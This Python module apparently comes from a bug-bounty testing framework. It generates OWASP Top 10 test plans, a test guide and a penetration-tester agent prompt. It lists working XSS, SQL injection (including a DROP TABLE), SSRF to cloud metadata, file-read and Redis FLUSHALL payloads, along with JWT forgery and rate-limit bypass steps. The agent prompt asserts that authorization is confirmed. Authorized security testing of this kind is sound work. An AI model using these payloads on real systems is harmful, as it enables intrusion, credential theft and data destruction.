"""
Phase 3A — Web Application Testing (OWASP Top 10)
==================================================
Generates structured test plans for each OWASP category.
Produces Puppeteer command sequences, cURL payloads, and agent prompts.

Agent: penetration-tester (primary), security-auditor (secondary)

Tests covered:
  - Auth bypass / session fixation
  - IDOR / broken access control
  - XSS (reflected, stored, DOM)
  - CSRF
  - SQL injection
  - SSRF / open redirect
  - JWT/OAuth weaknesses
  - Rate limiting / account lockout bypass
  - Security headers audit
  - Directory traversal / LFI
"""

import json
from pathlib import Path
from datetime import datetime


XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(document.domain)>",
    "javascript:alert(document.domain)",
    "<svg onload=alert(document.domain)>",
    "'\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "{{7*7}}",  # SSTI probe
    "${7*7}",   # SSTI probe
    "#{7*7}",   # SSTI probe
]

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",  # MSSQL
    "' AND 1=CONVERT(int,@@version)--",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://localhost:11211/",  # Memcached
    "gopher://localhost:6379/_FLUSHALL",  # Redis
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "///evil.com",
    "https://evil.com",
    "/\\evil.com",
    "https:evil.com",
    "javascript:alert(1)",
]

JWT_ATTACKS = [
    ("alg:none", "Set algorithm to 'none' and remove signature"),
    ("weak_secret", "Brute-force HMAC secret (common: 'secret', 'password', target domain)"),
    ("key_confusion", "Use public key as HMAC secret (RS256→HS256 confusion)"),
    ("kid_injection", "Inject path traversal or SQL in 'kid' header parameter"),
    ("exp_manipulation", "Set exp claim to year 9999 or remove it"),
]


def run_web_tests(target: str, output_dir: Path) -> None:
    web_dir = output_dir / "web"
    web_dir.mkdir(exist_ok=True)

    print(f"\n[PHASE 3A] Web Application Testing — {target}")
    print("=" * 60)

    # Load surface map if available
    endpoint_map = _load_endpoint_map(output_dir)

    # Generate test plans
    tests = {
        "target": target,
        "timestamp": datetime.utcnow().isoformat(),
        "test_categories": [],
    }

    categories = [
        ("auth", _gen_auth_tests),
        ("xss", _gen_xss_tests),
        ("sqli", _gen_sqli_tests),
        ("ssrf", _gen_ssrf_tests),
        ("csrf", _gen_csrf_tests),
        ("idor", _gen_idor_tests),
        ("jwt", _gen_jwt_tests),
        ("headers", _gen_headers_tests),
        ("rate_limiting", _gen_rate_limit_tests),
    ]

    for name, fn in categories:
        category = fn(target, endpoint_map)
        tests["test_categories"].append(category)
        print(f"  [+] {category['name']:30s} — {len(category['tests'])} test(s)")

    # Save full test plan
    plan_file = web_dir / "test_plan.json"
    plan_file.write_text(json.dumps(tests, indent=2))

    # Generate human-readable test guide
    guide = _generate_test_guide(target, tests, endpoint_map)
    guide_file = web_dir / "test_guide.md"
    guide_file.write_text(guide)

    # Generate penetration-tester agent prompt
    agent_prompt = _generate_agent_prompt(target, endpoint_map)
    agent_file = web_dir / "penetration_tester_prompt.md"
    agent_file.write_text(agent_prompt)

    print(f"\n[FILES]")
    print(f"  {web_dir}/test_plan.json")
    print(f"  {web_dir}/test_guide.md")
    print(f"  {web_dir}/penetration_tester_prompt.md")
    print(f"\n[NEXT] Use penetration_tester_prompt.md with the penetration-tester agent.")
    print(f"[NEXT] Run Puppeteer XSS tests from test_guide.md.")
    print(f"[NEXT] Store findings: python bounty.py exploit {target} <finding_id>\n")


def _load_endpoint_map(output_dir: Path) -> dict:
    ep_file = output_dir / "surface" / "endpoint_map.json"
    if ep_file.exists():
        return json.loads(ep_file.read_text())
    return {"auth_endpoints": [], "api_endpoints": [], "reachable_endpoints": []}


def _gen_auth_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "Authentication & Session",
        "owasp": "A07:2021",
        "cwe": "CWE-287",
        "tests": [
            {"id": "auth-01", "name": "Default credentials", "method": "manual",
             "steps": ["Try admin:admin, admin:password, root:root, test:test on login form"]},
            {"id": "auth-02", "name": "Username enumeration", "method": "timing",
             "steps": ["Submit valid vs invalid usernames — measure response time difference",
                       "Compare response body/size for valid vs invalid accounts"]},
            {"id": "auth-03", "name": "Session fixation", "method": "manual",
             "steps": ["Obtain session token before login",
                       "Login with valid credentials",
                       "Check if session token changes post-login — if same, fixation exists"]},
            {"id": "auth-04", "name": "Insecure cookie flags", "method": "puppeteer",
             "steps": ["puppeteer_evaluate: document.cookie",
                       "Verify HttpOnly, Secure, SameSite flags via DevTools Network tab",
                       "Flag any auth cookie missing HttpOnly or Secure"]},
            {"id": "auth-05", "name": "Auth bypass via parameter tampering", "method": "manual",
             "steps": ["Add ?admin=true, ?role=admin, ?debug=true to auth pages",
                       "Try X-Original-URL or X-Rewrite-URL headers on 403 pages"]},
            {"id": "auth-06", "name": "Password reset token reuse", "method": "manual",
             "steps": ["Request two password reset tokens",
                       "Use older token after newer one is issued — test for reuse"]},
        ],
    }


def _gen_xss_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "Cross-Site Scripting (XSS)",
        "owasp": "A03:2021",
        "cwe": "CWE-79",
        "payloads": XSS_PAYLOADS,
        "tests": [
            {"id": "xss-01", "name": "Reflected XSS in URL parameters", "method": "puppeteer",
             "steps": [
                 f"puppeteer_navigate(url='{target}/?q=<script>alert(document.domain)</script>')",
                 "puppeteer_evaluate: document.body.innerHTML.includes('alert(document.domain)')",
                 "puppeteer_screenshot(name='xss_reflected_probe')",
             ]},
            {"id": "xss-02", "name": "Reflected XSS in form inputs", "method": "puppeteer",
             "steps": [
                 "Navigate to each form found in Phase 2",
                 "puppeteer_fill(selector='input', value='<img src=x onerror=alert(1)>')",
                 "puppeteer_evaluate: check if payload is reflected unescaped",
             ]},
            {"id": "xss-03", "name": "DOM-based XSS", "method": "puppeteer",
             "steps": [
                 "puppeteer_evaluate: look for innerHTML, outerHTML, document.write usage",
                 "Check hash-based routing: navigate to /#<script>alert(1)</script>",
                 "Check for eval() with user-controlled input in JS source",
             ]},
            {"id": "xss-04", "name": "XSS in JSON responses", "method": "curl",
             "steps": [
                 "Look for endpoints returning user input in JSON",
                 "Inject payload: {\"name\": \"<script>alert(1)</script>\"}",
                 "Check if Content-Type is text/html instead of application/json",
             ]},
            {"id": "xss-05", "name": "SSTI probe (same input vectors)", "method": "curl",
             "steps": [
                 "Submit {{7*7}} and ${7*7} in all input fields",
                 "If response contains '49' — SSTI likely (escalate to RCE)",
             ]},
        ],
    }


def _gen_sqli_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "SQL Injection",
        "owasp": "A03:2021",
        "cwe": "CWE-89",
        "payloads": SQLI_PAYLOADS,
        "tests": [
            {"id": "sqli-01", "name": "Error-based SQLi", "method": "curl",
             "steps": ["Append ' to all string parameters",
                       "Look for SQL errors in response (MySQL, PostgreSQL, MSSQL syntax)",
                       "Try: ' AND 1=1-- vs ' AND 1=2-- (boolean-based detection)"]},
            {"id": "sqli-02", "name": "Time-based blind SQLi", "method": "curl",
             "steps": ["Submit: 1' AND SLEEP(5)-- (MySQL)",
                       "Submit: 1'; WAITFOR DELAY '0:0:5'-- (MSSQL)",
                       "Measure response time — >5s indicates vulnerability"]},
            {"id": "sqli-03", "name": "Login bypass", "method": "puppeteer",
             "steps": [
                 "puppeteer_fill(selector='input[name=username]', value=\"' OR '1'='1'--\")",
                 "puppeteer_fill(selector='input[name=password]', value='anything')",
                 "puppeteer_screenshot(name='sqli_login_bypass')",
             ]},
            {"id": "sqli-04", "name": "Verify via mcp__postgres__query (lab only)", "method": "mcp",
             "steps": ["If you have lab DB access, verify extraction with:",
                       "mcp__postgres__query: SELECT version();",
                       "Use this to confirm impact in authorized lab environment only"]},
        ],
    }


def _gen_ssrf_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "SSRF / Open Redirect",
        "owasp": "A10:2021",
        "cwe": "CWE-918",
        "payloads": SSRF_PAYLOADS + OPEN_REDIRECT_PAYLOADS,
        "tests": [
            {"id": "ssrf-01", "name": "SSRF via URL parameters", "method": "curl",
             "steps": ["Find parameters accepting URLs: url=, redirect=, next=, dest=, fetch=",
                       "Submit: http://169.254.169.254/latest/meta-data/",
                       "Look for AWS/GCP/Azure metadata in response"]},
            {"id": "ssrf-02", "name": "Open redirect", "method": "puppeteer",
             "steps": [
                 "Find redirect parameters: ?next=, ?redirect=, ?url=, ?return=",
                 f"puppeteer_navigate(url='{target}/login?next=//evil.com')",
                 "puppeteer_screenshot(name='open_redirect_probe')",
                 "Check Location header or final URL after redirect",
             ]},
            {"id": "ssrf-03", "name": "PDF/Image SSRF", "method": "curl",
             "steps": ["Check for features generating PDFs or fetching images from URLs",
                       "Submit SSRF payload as image/PDF source URL",
                       "Use Burp Collaborator or webhook.site to detect OOB callbacks"]},
        ],
    }


def _gen_csrf_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "CSRF",
        "owasp": "A01:2021",
        "cwe": "CWE-352",
        "tests": [
            {"id": "csrf-01", "name": "CSRF token validation", "method": "curl",
             "steps": ["Capture a state-changing POST request",
                       "Replay without CSRF token — check if rejected",
                       "Replay with empty CSRF token (token=)",
                       "Replay with random CSRF token value"]},
            {"id": "csrf-02", "name": "SameSite cookie attribute", "method": "puppeteer",
             "steps": ["puppeteer_evaluate: document.cookie",
                       "Verify auth cookies have SameSite=Strict or SameSite=Lax",
                       "Absence of SameSite = CSRF possible from cross-site requests"]},
            {"id": "csrf-03", "name": "CORS misconfiguration", "method": "curl",
             "steps": ["Send: Origin: https://evil.com",
                       "Check Access-Control-Allow-Origin in response",
                       "If reflects origin + Access-Control-Allow-Credentials: true = critical CORS vuln"]},
        ],
    }


def _gen_idor_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "IDOR / Broken Access Control",
        "owasp": "A01:2021",
        "cwe": "CWE-639",
        "tests": [
            {"id": "idor-01", "name": "IDOR on object endpoints", "method": "curl",
             "steps": ["Find endpoints with IDs: /api/user/123, /order/456",
                       "Authenticate as User A, access User B's objects by changing ID",
                       "Check if response returns data belonging to other users"]},
            {"id": "idor-02", "name": "Horizontal privilege escalation", "method": "curl",
             "steps": ["Register two accounts",
                       "Use account A's auth token to access /api/user/<account_B_id>",
                       "Flag if data is returned instead of 403/404"]},
            {"id": "idor-03", "name": "Vertical privilege escalation", "method": "curl",
             "steps": ["Access admin endpoints with regular user token",
                       "Try: /api/admin, /admin/users, /api/v1/admin",
                       "Modify role in JWT payload (if JWT is used without server-side verification)"]},
            {"id": "idor-04", "name": "GUID/UUID predictability", "method": "analysis",
             "steps": ["Collect multiple object IDs from API responses",
                       "Check if IDs are sequential integers (trivially enumerable)",
                       "Check if GUIDs are v1 (time-based, predictable)"]},
        ],
    }


def _gen_jwt_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "JWT / OAuth2",
        "owasp": "A02:2021",
        "cwe": "CWE-347",
        "attacks": JWT_ATTACKS,
        "tests": [
            {"id": "jwt-01", "name": "Algorithm confusion (none)", "method": "curl",
             "steps": ["Capture JWT token",
                       "Decode header: echo '<base64_header>' | base64 -d",
                       "Modify alg to 'none', remove signature, re-encode",
                       "Submit modified token — if accepted, alg=none attack works"]},
            {"id": "jwt-02", "name": "Weak HMAC secret", "method": "tool",
             "steps": ["Use jwt_tool or hashcat to brute-force HS256 secret",
                       "Common secrets: 'secret', 'password', domain name, app name",
                       "If cracked, forge tokens with elevated roles/claims"]},
            {"id": "jwt-03", "name": "RS256→HS256 key confusion", "method": "curl",
             "steps": ["Obtain server's public key from /jwks.json or /.well-known/jwks.json",
                       "Sign token using public key as HMAC secret with HS256 algorithm",
                       "Submit — if server uses same key for verification, attack succeeds"]},
            {"id": "jwt-04", "name": "Claim manipulation", "method": "analysis",
             "steps": ["Decode JWT payload (base64 decode middle segment)",
                       "Look for: role, admin, user_id, scope, sub claims",
                       "If not verified server-side, modify claims to elevate privileges"]},
        ],
    }


def _gen_headers_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "Security Headers Audit",
        "owasp": "A05:2021",
        "cwe": "CWE-693",
        "tests": [
            {"id": "hdr-01", "name": "Missing security headers", "method": "curl",
             "steps": [
                 f"curl -I {target}",
                 "Check for: Strict-Transport-Security, Content-Security-Policy,",
                 "X-Content-Type-Options, X-Frame-Options, Permissions-Policy",
                 "Missing HSTS = downgrade attack possible",
                 "Missing CSP = XSS impact amplified",
             ]},
            {"id": "hdr-02", "name": "CORS configuration", "method": "curl",
             "steps": [f"curl -H 'Origin: https://evil.com' -I {target}",
                       "Check Access-Control-Allow-Origin response header",
                       "Wildcard (*) + credentials = critical"]},
            {"id": "hdr-03", "name": "Clickjacking", "method": "puppeteer",
             "steps": ["puppeteer_evaluate: check X-Frame-Options header",
                       "If missing, create test iframe: <iframe src='TARGET_URL'>",
                       "Screenshot to demonstrate clickjacking potential"]},
        ],
    }


def _gen_rate_limit_tests(target: str, ep_map: dict) -> dict:
    return {
        "name": "Rate Limiting / Account Lockout",
        "owasp": "A04:2021",
        "cwe": "CWE-770",
        "tests": [
            {"id": "rate-01", "name": "Brute-force login", "method": "automation",
             "steps": ["Send 10 rapid login attempts with wrong passwords",
                       "Check if account locks out or rate limiting triggers",
                       "Test bypass: rotate IPs via X-Forwarded-For header",
                       "Test bypass: add spaces to username ('admin ' vs 'admin')"]},
            {"id": "rate-02", "name": "API rate limiting", "method": "automation",
             "steps": ["Send 100 requests/minute to API endpoints",
                       "Check for 429 Too Many Requests response",
                       "Test bypass: remove/rotate Authorization header",
                       "Test bypass: add X-Forwarded-For: 1.2.3.4 to rotate apparent IP"]},
            {"id": "rate-03", "name": "Password reset rate limit", "method": "manual",
             "steps": ["Request 20 password resets in quick succession",
                       "Check if throttled or if tokens still sent",
                       "Unlimited resets = account enumeration + email flooding"]},
        ],
    }


def _generate_test_guide(target: str, tests: dict, ep_map: dict) -> str:
    lines = [
        f"# Web Application Test Guide — {target}",
        f"Generated: {tests['timestamp']}",
        "",
        "## Pre-Testing Checklist",
        "",
        "- [ ] Scope confirmed in scope.json",
        "- [ ] Phase 1 recon completed",
        "- [ ] Phase 2 surface map available",
        "- [ ] Burp Suite / proxy running (optional but recommended)",
        "",
        "---",
        "",
    ]
    for cat in tests["test_categories"]:
        lines += [
            f"## {cat['name']}",
            f"OWASP: `{cat.get('owasp', 'N/A')}` | CWE: `{cat.get('cwe', 'N/A')}`",
            "",
        ]
        for test in cat["tests"]:
            lines += [
                f"### {test['id']} — {test['name']}",
                f"Method: `{test['method']}`",
                "",
                "**Steps:**",
            ]
            for step in test["steps"]:
                lines.append(f"1. {step}")
            lines += ["", "**Result:** `[ ] Pass  [ ] Fail  [ ] N/A`", "**Notes:**", "", "---", ""]
        if "payloads" in cat:
            lines += [
                "**Payloads for this category:**",
                "```",
            ]
            for p in cat["payloads"][:5]:
                lines.append(p)
            lines += ["```", ""]
    return "\n".join(lines)


def _generate_agent_prompt(target: str, ep_map: dict) -> str:
    endpoints = [e["url"] for e in ep_map.get("auth_endpoints", [])[:10]]
    ep_list = "\n".join(f"  - {u}" for u in endpoints) or "  - (run Phase 2 first)"
    return f"""# penetration-tester Agent Prompt

Use this with the `penetration-tester` agent in Claude Code.

---

## Task

Perform a comprehensive web application security assessment of: **{target}**

Authorization has been confirmed in scope.json.

## Known Endpoints

{ep_list}

## Test Scope

Evaluate all OWASP Top 10 (2021) categories:

1. **A01 — Broken Access Control**: IDOR, privilege escalation, path traversal
2. **A02 — Cryptographic Failures**: Weak JWT, cleartext secrets, insecure cookies
3. **A03 — Injection**: SQLi, XSS (reflected/stored/DOM), SSTI, command injection
4. **A04 — Insecure Design**: Business logic flaws, rate limiting bypass
5. **A05 — Security Misconfiguration**: Missing headers, default creds, debug endpoints
6. **A07 — Auth Failures**: Brute-force, session fixation, password reset flaws
7. **A10 — SSRF**: URL parameters, webhook endpoints, PDF generators

## For Each Finding, Provide

- Severity (Critical/High/Medium/Low) + CVSS v3.1 vector
- CWE ID
- OWASP category
- Step-by-step reproduction
- Business impact
- Remediation recommendation

## PoC Requirements

- Use mcp__puppeteer__* for browser-based evidence
- Screenshot every critical step
- Provide working cURL command or Python requests PoC

## Output Format

Save each finding as a structured JSON file using:
`mcp__filesystem__write_file` → `output/{target}/findings/<id>.json`
"""
